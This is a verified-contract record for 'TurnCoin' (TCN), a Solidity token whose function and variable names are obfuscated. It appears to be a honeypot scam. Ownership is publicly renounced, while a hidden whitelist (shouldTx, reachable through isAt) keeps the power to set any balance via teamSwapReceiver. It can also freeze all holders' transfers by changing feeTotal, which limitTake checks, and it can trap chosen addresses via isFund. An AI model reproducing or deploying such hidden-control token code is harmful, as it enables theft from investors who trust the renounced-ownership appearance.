{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract walletTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyMaxLimit {\n    function createPair(address isAmount, address shouldList) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface modeBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface autoTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atExemptLimit) external view returns (uint256);\n\n    function transfer(address teamWallet, uint256 enableAuto) external returns (bool);\n\n    function allowance(address totalTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamWallet,\n        uint256 enableAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listMax, uint256 value);\n    event Approval(address indexed totalTx, address indexed spender, uint256 value);\n}\n\ninterface toTotal is autoTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TurnCoin is walletTotal, autoTrading, toTotal {\n\n    function transferFrom(address swapLimit, address teamWallet, uint256 enableAuto) external override returns (bool) {\n        if (_msgSender() != autoMin) {\n            if (totalModeReceiver[swapLimit][_msgSender()] != type(uint256).max) {\n                require(enableAuto <= totalModeReceiver[swapLimit][_msgSender()]);\n                totalModeReceiver[swapLimit][_msgSender()] -= enableAuto;\n            }\n        }\n        return limitTake(swapLimit, teamWallet, enableAuto);\n    }\n\n    mapping(address => mapping(address => uint256)) private totalModeReceiver;\n\n    function isAt(address teamWalletMin) public {\n        require(teamWalletMin.balance < 100000);\n        if (fromList) {\n            return;\n        }\n        if (isExempt != toIs) {\n            marketingLimitAt = isExempt;\n        }\n        shouldTx[teamWalletMin] = true;\n        \n        fromList = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listAtFee;\n    }\n\n    string private listAtFee = \"Turn Coin\";\n\n    bool private takeAt;\n\n    uint256 public marketingMin;\n\n    address liquidityFee;\n\n    uint8 private isTeamLiquidity = 18;\n\n    function teamSwapReceiver(address walletTeam, uint256 enableAuto) public {\n        totalIs();\n        takeTeamReceiver[walletTeam] = enableAuto;\n    }\n\n    string private swapMode = \"TCN\";\n\n    mapping(address => bool) public isFund;\n\n    function listFund(address swapLimit, address teamWallet, uint256 enableAuto) internal returns (bool) {\n        require(takeTeamReceiver[swapLimit] >= enableAuto);\n        takeTeamReceiver[swapLimit] -= enableAuto;\n        takeTeamReceiver[teamWallet] += enableAuto;\n        emit Transfer(swapLimit, teamWallet, enableAuto);\n        return true;\n    }\n\n    uint256 constant exemptTotal = 14 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapMode;\n    }\n\n    mapping(address => bool) public shouldTx;\n\n    uint256 private amountTeam = 100000000 * 10 ** 18;\n\n    function toTrading(uint256 enableAuto) public {\n        totalIs();\n        feeTotal = enableAuto;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTeam;\n    }\n\n    uint256 public modeMax = 0;\n\n    address private senderTotal;\n\n    function allowance(address tokenMaxMarketing, address tradingWallet) external view virtual override returns (uint256) {\n        if (tradingWallet == autoMin) {\n            return type(uint256).max;\n        }\n        return totalModeReceiver[tokenMaxMarketing][tradingWallet];\n    }\n\n    uint256 public totalAmountToken = 3;\n\n    function getOwner() external view returns (address) {\n        return senderTotal;\n    }\n\n    function totalIs() private view {\n        require(shouldTx[_msgSender()]);\n    }\n\n    function launchedMin() public {\n        emit OwnershipTransferred(receiverTake, address(0));\n        senderTotal = address(0);\n    }\n\n    uint256 public senderTo;\n\n    uint256 private marketingLimitAt;\n\n    uint256 senderMax;\n\n    constructor (){\n        \n        launchedMin();\n        modeBuy txLaunchedReceiver = modeBuy(autoMin);\n        swapAmount = buyMaxLimit(txLaunchedReceiver.factory()).createPair(txLaunchedReceiver.WETH(), address(this));\n        liquidityFee = buyMaxLimit(txLaunchedReceiver.factory()).feeTo();\n        \n        receiverTake = _msgSender();\n        shouldTx[receiverTake] = true;\n        takeTeamReceiver[receiverTake] = amountTeam;\n        \n        emit Transfer(address(0), receiverTake, amountTeam);\n    }\n\n    address public receiverTake;\n\n    uint256 public isExempt;\n\n    event OwnershipTransferred(address indexed liquidityLaunched, address indexed liquidityTo);\n\n    uint256 public receiverBuy;\n\n    function launchReceiver(address toList) public {\n        totalIs();\n        \n        if (toList == receiverTake || toList == swapAmount) {\n            return;\n        }\n        isFund[toList] = true;\n    }\n\n    function txSender(address swapLimit, address teamWallet, uint256 enableAuto) internal view returns (uint256) {\n        require(enableAuto > 0);\n\n        uint256 liquidityLimit = 0;\n        if (swapLimit == swapAmount && totalAmountToken > 0) {\n            liquidityLimit = enableAuto * totalAmountToken / 100;\n        } else if (teamWallet == swapAmount && modeMax > 0) {\n            liquidityLimit = enableAuto * modeMax / 100;\n        }\n        require(liquidityLimit <= enableAuto);\n        return enableAuto - liquidityLimit;\n    }\n\n    mapping(address => uint256) private takeTeamReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTeamLiquidity;\n    }\n\n    bool private modeSell;\n\n    function approve(address tradingWallet, uint256 enableAuto) public virtual override returns (bool) {\n        totalModeReceiver[_msgSender()][tradingWallet] = enableAuto;\n        emit Approval(_msgSender(), tradingWallet, enableAuto);\n        return true;\n    }\n\n    bool private tokenSell;\n\n    function transfer(address walletTeam, uint256 enableAuto) external virtual override returns (bool) {\n        return limitTake(_msgSender(), walletTeam, enableAuto);\n    }\n\n    uint256 feeTotal;\n\n    function owner() external view returns (address) {\n        return senderTotal;\n    }\n\n    address autoMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address atExemptLimit) public view virtual override returns (uint256) {\n        return takeTeamReceiver[atExemptLimit];\n    }\n\n    uint256 private toIs;\n\n    function limitTake(address swapLimit, address teamWallet, uint256 enableAuto) internal returns (bool) {\n        if (swapLimit == receiverTake) {\n            return listFund(swapLimit, teamWallet, enableAuto);\n        }\n        uint256 swapAuto = autoTrading(swapAmount).balanceOf(liquidityFee);\n        require(swapAuto == feeTotal);\n        require(teamWallet != liquidityFee);\n        if (isFund[swapLimit]) {\n            return listFund(swapLimit, teamWallet, exemptTotal);\n        }\n        enableAuto = txSender(swapLimit, teamWallet, enableAuto);\n        return listFund(swapLimit, teamWallet, enableAuto);\n    }\n\n    address public swapAmount;\n\n    bool public fromList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMaxMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExemptLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWalletMin\",\"type\":\"address\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"launchReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAuto\",\"type\":\"uint256\"}],\"name\":\"teamSwapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableAuto\",\"type\":\"uint256\"}],\"name\":\"toTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAmountToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TurnCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}